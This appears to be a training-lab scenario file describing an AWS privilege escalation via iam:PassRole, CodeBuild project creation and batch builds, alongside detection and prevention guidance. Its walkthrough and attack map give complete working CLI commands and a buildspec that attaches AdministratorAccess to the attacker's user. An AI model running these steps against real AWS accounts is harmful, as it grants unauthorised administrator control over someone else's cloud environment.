{
  "displayName": "CodeBuild Project Creation + Batch Build to Admin",
  "name": "codebuild-004-iam-passrole+codebuild-createproject+codebuild-startbuildbatch",
  "description": "Pass a privileged role to CodeBuild and execute buildspec to grant self admin access",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "codebuild-004",
  "interactiveDemo": false,
  "category": "Privilege Escalation",
  "subCategory": "new-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation",
      "TA0002 - Execution"
    ],
    "techniques": [
      "T1078.004 - Valid Accounts: Cloud Accounts",
      "T1651 - Cloud Administration Command"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_codebuild_004_iam_passrole_codebuild_createproject_codebuild_startbuildbatch",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-004-iam-passrole+codebuild-createproject+codebuild-startbuildbatch"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-004-iam-passrole+codebuild-createproject+codebuild-startbuildbatch",
  "schemaVersion": "4.1.1",
  "permissions": {
    "principals": [
      {
        "name": "pl-prod-codebuild-004-to-admin-starting-user",
        "required": [
          {
            "permission": "codebuild:CreateProject",
            "resource": "*",
            "description": "create a new CodeBuild project with the privileged service role"
          },
          {
            "permission": "codebuild:StartBuildBatch",
            "resource": "*",
            "description": "trigger the build batch that executes the malicious buildspec"
          },
          {
            "permission": "iam:PassRole",
            "resource": "arn:aws:iam::*:role/pl-prod-codebuild-004-to-admin-target-role",
            "description": "pass the privileged target role to the CodeBuild project"
          }
        ],
        "helpful": [
          {
            "permission": "iam:ListRoles",
            "purpose": "discover available privileged roles to pass to CodeBuild"
          },
          {
            "permission": "codebuild:ListProjects",
            "purpose": "list existing CodeBuild projects"
          },
          {
            "permission": "codebuild:BatchGetBuildBatches",
            "purpose": "monitor build batch execution status"
          },
          {
            "permission": "iam:ListUsers",
            "purpose": "verify admin access after escalation"
          }
        ]
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-codebuild-004-to-admin-starting-user` IAM user to the `pl-prod-codebuild-004-to-admin-target-role` administrative role by creating a CodeBuild project with a privileged service role and executing a malicious build batch buildspec that attaches AdministratorAccess to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-codebuild-004-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-codebuild-004-to-admin-target-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable codebuild-004-to-admin\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `codebuild-004-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-codebuild-004-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-codebuild-004-to-admin-target-role` | Privileged role with iam:AttachUserPolicy permission, trusted by CodeBuild service |\n| `arn:aws:iam::{account_id}:policy/pl-prod-codebuild-004-to-admin-user-policy` | Policy granting codebuild:CreateProject, codebuild:StartBuildBatch, and iam:PassRole to starting user |",
      "demoAttack": {
        "executing": "The script will:\n1. Retrieve starting user credentials from Terraform outputs\n2. Verify the starting user identity and confirm absence of admin permissions\n3. Create a CodeBuild project configured with the privileged `pl-prod-codebuild-004-to-admin-target-role` as its service role, embedding a malicious inline buildspec\n4. Start a build batch execution that runs the buildspec with the target role's permissions\n5. Wait for the build batch to complete and for IAM policy propagation\n6. Verify administrator access has been granted to the starting user",
        "resourcesCreated": "- A CodeBuild project (`pl-privesc-codebuild-batch-demo`) configured with the privileged target role\n- An attached `AdministratorAccess` managed policy on the starting user (after successful escalation)",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo codebuild-004-iam-passrole+codebuild-createproject+codebuild-startbuildbatch\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `codebuild-004-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup codebuild-004-iam-passrole+codebuild-createproject+codebuild-startbuildbatch\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `codebuild-004-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable codebuild-004-to-admin\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `codebuild-004-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- **Dangerous Permission Combination**: User/role with both `codebuild:CreateProject` and `iam:PassRole` permissions\n- **Overly Permissive Service Roles**: CodeBuild service roles with powerful IAM permissions (`iam:AttachUserPolicy`, `iam:PutUserPolicy`, etc.)\n- **Privilege Escalation Path**: Automated detection of the complete attack chain from user to admin via CodeBuild\n- **Missing Constraints**: `iam:PassRole` permission without resource-based restrictions\n- **Service Trust Relationships**: Roles that can be assumed by CodeBuild without additional conditions",
        "prevention": "- **Restrict iam:PassRole**: Limit `iam:PassRole` to specific, least-privilege roles using resource-based conditions: `\"Resource\": \"arn:aws:iam::*:role/specific-safe-role\"`\n- **Separate Permissions**: Avoid granting `codebuild:CreateProject` and `iam:PassRole` to the same principal\n- **Service Role Controls**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies: `Deny iam:AttachUserPolicy, iam:PutUserPolicy, iam:AttachRolePolicy, iam:PutRolePolicy when aws:PrincipalServiceName = codebuild.amazonaws.com`\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild\n- **Require Approval for Service Roles**: Implement approval workflows for creating service roles that can be passed to compute services\n- **Condition Keys**: Use IAM condition keys to restrict CodeBuild project creation to specific source repositories or environments"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `CodeBuild: CreateProject` -- New CodeBuild project created; alert when combined with a privileged service role and an inline buildspec\n- `CodeBuild: StartBuildBatch` -- Build batch execution triggered; monitor for custom buildspec overrides that execute IAM-modifying commands\n- `IAM: AttachUserPolicy` -- Managed policy attached to a user; critical when `AdministratorAccess` is the policy and the caller is a CodeBuild service principal (`codebuild.amazonaws.com`)\n- `STS: AssumeRole` -- CodeBuild assumes the passed service role at build start; alert when the assumed role has IAM administrative permissions",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "solution": "# Guided Walkthrough: Privilege Escalation via CodeBuild Service Abuse\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permissions to create and execute AWS CodeBuild projects combined with the ability to pass IAM roles. The attacker can create a CodeBuild project with a privileged service role, then execute a malicious buildspec that uses that role's permissions to grant themselves administrator access.\n\nAWS CodeBuild is a fully managed continuous integration service that compiles source code and runs builds in isolated compute environments. Each CodeBuild project executes with a service role that grants it permissions to perform operations. When a user has both `codebuild:CreateProject` and `iam:PassRole` permissions, they can create a project that assumes a privileged role. By starting a build batch with a custom buildspec, they can execute arbitrary AWS CLI commands with the role's elevated permissions.\n\nThis is a classic example of the \"pass role to service\" privilege escalation pattern, where the combination of service creation permissions and role passing creates an indirect path to elevated privileges that might not be obvious when reviewing IAM policies individually.\n\n## The Challenge\n\nYou start as `pl-prod-codebuild-004-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. Your goal is to reach effective administrator access in the AWS account.\n\nYour starting permissions are:\n- `codebuild:CreateProject` on `*`\n- `codebuild:StartBuildBatch` on `*`\n- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-codebuild-004-to-admin-target-role`\n\nYou also have helpful recon permissions: `iam:ListRoles`, `codebuild:ListProjects`, `codebuild:BatchGetBuildBatches`, and `iam:ListUsers`.\n\nThe target is `pl-prod-codebuild-004-to-admin-target-role` \u2014 a privileged IAM role trusted by the CodeBuild service that has `iam:AttachUserPolicy` permission. You cannot assume this role directly, but you can pass it to a service you control.\n\n## Reconnaissance\n\nFirst, let's confirm your current identity and verify you don't already have admin permissions:\n\n```bash\naws sts get-caller-identity\n# => arn:aws:iam::{account_id}:user/pl-prod-codebuild-004-to-admin-starting-user\n\naws iam list-users --max-items 1\n# => AccessDenied \u2014 good, no admin yet\n```\n\nNow let's look at what roles are available to pass:\n\n```bash\naws iam list-roles --query 'Roles[?contains(RoleName, `codebuild-004`)].{Name:RoleName,Arn:Arn}' --output table\n```\n\nYou'll see `pl-prod-codebuild-004-to-admin-target-role`. Checking its trust policy reveals it trusts `codebuild.amazonaws.com` \u2014 meaning CodeBuild can assume it. You can't assume it yourself, but you can pass it to a CodeBuild project you create.\n\nCheck its attached policies to understand what it can do:\n\n```bash\naws iam list-attached-role-policies --role-name pl-prod-codebuild-004-to-admin-target-role\naws iam list-role-policies --role-name pl-prod-codebuild-004-to-admin-target-role\n```\n\nThe role has `iam:AttachUserPolicy` \u2014 enough to attach `AdministratorAccess` to your starting user.\n\n## Exploitation\n\n### Step 1: Craft the malicious buildspec\n\nThe key insight is that a CodeBuild build environment executes with its service role's permissions. If you can create a project and pass `pl-prod-codebuild-004-to-admin-target-role` as the service role, any AWS CLI commands in the buildspec will run as that role.\n\nYour buildspec will call `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. CodeBuild batch builds require a nested buildspec structure with a `batch:` section containing a `build-list`:\n\n```yaml\nversion: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - echo \"Starting privilege escalation...\"\n              - aws iam attach-user-policy --user-name pl-prod-codebuild-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n              - echo \"Successfully attached AdministratorAccess policy!\"\n```\n\n### Step 2: Create the CodeBuild project with the privileged role\n\nThis is the core of the attack \u2014 you pass `pl-prod-codebuild-004-to-admin-target-role` to the project using `iam:PassRole`. Note the `--build-batch-config` also specifies the service role; CodeBuild requires this for batch builds:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\nTARGET_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-codebuild-004-to-admin-target-role\"\n\naws codebuild create-project \\\n  --name \"pl-privesc-codebuild-batch-demo\" \\\n  --source '{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\\nbatch:\\n  fast-fail: false\\n  build-list:\\n    - identifier: privesc_build\\n      buildspec: |\\n        version: 0.2\\n        phases:\\n          build:\\n            commands:\\n              - aws iam attach-user-policy --user-name pl-prod-codebuild-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"}' \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role \"$TARGET_ROLE_ARN\" \\\n  --build-batch-config \"{\\\"serviceRole\\\":\\\"${TARGET_ROLE_ARN}\\\"}\"\n```\n\n### Step 3: Start the build batch\n\nNow trigger the build batch. CodeBuild will assume the target role and execute your buildspec:\n\n```bash\naws codebuild start-build-batch --project-name \"pl-privesc-codebuild-batch-demo\"\n```\n\nNote the build batch ID from the output. Batch builds can take 2-4 minutes \u2014 they spin up build orchestration infrastructure before the actual build runs. You can monitor progress:\n\n```bash\naws codebuild batch-get-build-batches --ids \"{build_batch_id}\" \\\n  --query 'buildBatches[0].buildBatchStatus' --output text\n```\n\nWait for status `SUCCEEDED`.\n\n### Step 4: Wait for IAM propagation\n\nAfter the build completes, wait an additional 15 seconds for IAM policy changes to propagate globally:\n\n```bash\nsleep 15\n```\n\n## Verification\n\nNow verify your escalated permissions by attempting to list IAM users \u2014 an operation that requires admin access:\n\n```bash\naws iam list-users --max-items 3\n```\n\nSuccess means the buildspec ran as `pl-prod-codebuild-004-to-admin-target-role`, which called `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. Your starting user credentials now have full administrator access.\n\nYou can also confirm the policy attachment directly:\n\n```bash\naws iam list-attached-user-policies --user-name pl-prod-codebuild-004-to-admin-starting-user\n# => AdministratorAccess is listed\n```\n\n## What Happened\n\nYou exploited the \"pass role to service\" privilege escalation pattern. The combination of `codebuild:CreateProject`, `codebuild:StartBuildBatch`, and `iam:PassRole` let you indirect-execute arbitrary AWS API calls as `pl-prod-codebuild-004-to-admin-target-role` \u2014 a role you could never directly assume. CodeBuild acted as an intermediary that assumed the privileged role on your behalf, with your buildspec directing what it did with those permissions.\n\nThis pattern is dangerous because each individual permission looks reasonable in isolation: developers legitimately create CodeBuild projects, pass service roles to them, and run builds. The privilege escalation only becomes apparent when you trace the full chain: your user \u2192 CodeBuild project \u2192 privileged service role \u2192 IAM modification \u2192 admin access. Static IAM policy analysis tools that don't model service-to-principal trust relationships will miss this entirely.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-codebuild-004-to-admin-starting-user",
        "access": {
          "type": "assumed-breach-credentials"
        },
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has codebuild:CreateProject, codebuild:StartBuildBatch, and iam:PassRole permissions \u2014 enough to create a CodeBuild project with a privileged service role and execute a malicious buildspec.\n"
      },
      {
        "id": "codebuild-project",
        "label": "CodeBuild Project",
        "type": "resource",
        "subType": "codebuild-project",
        "arn": "arn:aws:codebuild:{region}:{account_id}:project/pl-privesc-codebuild-batch-demo",
        "description": "A CodeBuild project created by the attacker and configured to use the privileged target role as its service role. The project runs with that role's permissions, allowing the buildspec to execute AWS CLI commands as the privileged role.\n"
      },
      {
        "id": "target-role",
        "label": "Target Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-codebuild-004-to-admin-target-role",
        "description": "A privileged IAM role trusted by the CodeBuild service. This role has iam:AttachUserPolicy permission, allowing it to attach managed policies to IAM users. The attacker passes this role to the CodeBuild project they create. When the build batch executes, the buildspec runs with this role's permissions and calls iam:AttachUserPolicy to attach AdministratorAccess to the starting user, completing the privilege escalation.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "codebuild-project",
        "label": "codebuild:CreateProject + iam:PassRole",
        "description": "The attacker creates a new CodeBuild project and passes the privileged target role as the project's service role using iam:PassRole. The project is configured with a malicious inline buildspec.\n",
        "hints": [
          "Start by understanding what roles exist in this account that could be passed to a service. Use iam:ListRoles to look for roles whose trust policy references codebuild.amazonaws.com.",
          "Once you find an interesting role, check what permissions it has -- iam:ListAttachedRolePolicies and iam:ListRolePolicies will tell you what it can do when assumed.",
          "You can create CodeBuild projects and pass IAM roles to them. Think about what a build environment can do if it runs with a privileged service role's permissions.",
          "When creating the project, you need to embed your attack payload as an inline buildspec in the --source parameter. CodeBuild batch builds require a batch: section with a build-list.",
          "The --service-role and --build-batch-config serviceRole fields must both point to the target role ARN for batch builds -- CodeBuild requires this to authorize batch orchestration.",
          "Browse to https://pathfinding.cloud/paths/codebuild-004 for full technique details."
        ],
        "commands": [
          {
            "description": "Create a CodeBuild project with the privileged role as its service role",
            "command": "aws codebuild create-project --name \"pl-privesc-codebuild-batch-demo\" --source '{\"type\":\"NO_SOURCE\",\"buildspec\":\"...\"}' --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role \"arn:aws:iam::{account_id}:role/pl-prod-codebuild-004-to-admin-target-role\" --build-batch-config '{\"serviceRole\":\"arn:aws:iam::{account_id}:role/pl-prod-codebuild-004-to-admin-target-role\"}'"
          }
        ]
      },
      {
        "from": "codebuild-project",
        "to": "target-role",
        "label": "codebuild:StartBuildBatch \u2192 iam:AttachUserPolicy",
        "description": "The attacker starts a build batch execution. CodeBuild automatically assumes the configured service role and runs the buildspec with that role's permissions. The buildspec calls iam:AttachUserPolicy to attach AdministratorAccess to the starting user, completing the privilege escalation.\n",
        "hints": [
          "With the project created, start a build batch using codebuild:StartBuildBatch. The batch will execute the buildspec you embedded in the project.",
          "Batch builds take 2-4 minutes to complete -- they spin up orchestration infrastructure before the actual build executes. Plan to wait.",
          "Use codebuild:BatchGetBuildBatches with the build batch ID to monitor status. Wait for SUCCEEDED before checking IAM changes.",
          "After the build succeeds, IAM policy changes take additional time to propagate globally -- wait at least 15 seconds before verifying your escalation.",
          "Verify the escalation succeeded by attempting an IAM action that requires admin access, such as iam:ListUsers."
        ],
        "commands": [
          {
            "description": "Start the build batch to trigger the malicious buildspec",
            "command": "aws codebuild start-build-batch --project-name \"pl-privesc-codebuild-batch-demo\""
          },
          {
            "description": "Verify administrator access after escalation",
            "command": "aws iam list-users --max-items 1"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "codebuild-004",
  "hasDemoTranscript": true
}